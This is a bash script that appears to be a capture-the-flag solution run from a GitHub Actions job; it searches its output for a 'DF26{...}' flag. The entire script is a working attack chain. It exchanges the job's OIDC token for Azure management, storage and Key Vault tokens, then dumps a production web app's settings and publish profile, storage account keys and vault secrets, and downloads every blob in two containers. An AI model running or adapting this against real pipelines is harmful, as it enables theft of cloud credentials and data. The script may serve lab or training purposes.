#!/usr/bin/env bash
set +e
RG="rg-tbl-platform-prod-sea"; SUB="$AZURE_SUBSCRIPTION_ID"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])")
gt(){ curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=${OIDC}" | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('access_token') or 'ERR')"; }
ARM=$(gt "https://management.azure.com/.default"); ST=$(gt "https://storage.azure.com/.default"); KV=$(gt "https://vault.azure.net/.default")
echo "tokens ARM=${#ARM} ST=${#ST} KV=${#KV}"
B="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod"
echo "=== app settings ==="; curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "$B/config/appsettings/list?api-version=2022-09-01" | python3 -c "import json,sys;d=json.load(sys.stdin);print(json.dumps(d.get('properties',d))[:1500])" 2>&1 | head -5
echo "=== publish profile ==="; curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "$B/publishxml?api-version=2022-09-01" | head -c 400; echo
echo "=== backup account listKeys ==="; curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblbackupprodx3euoz/listKeys?api-version=2023-01-01" | head -c 200; echo
echo "=== exports LIST (AAD data plane) ==="; curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" | head -c 1500; echo
echo "=== appcfg config LIST ==="; curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list" | head -c 1500; echo
echo "=== kv-tbl-sec ==="; curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | head -c 500; echo
echo "=== grep flag everywhere above handled below ==="
# fetch config blob directly if listing worked
for acct in sttblbackupprodx3euoz:exports sttblappcfgprodx3euoz:config; do
  A=${acct%%:*}; C=${acct#*:}
  LST=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "https://$A.blob.core.windows.net/$C?restype=container&comp=list")
  for BL in $(echo "$LST" | grep -oE '<Name>[^<]+</Name>' | sed 's/<[^>]*>//g'); do
    echo "BLOB $A/$C/$BL:"; curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "https://$A.blob.core.windows.net/$C/$BL" | head -c 2000; echo
  done
done 2>&1 | grep -aoE 'DF26\{[0-9a-fA-F]+\}' | sort -u
echo "=== done ==="
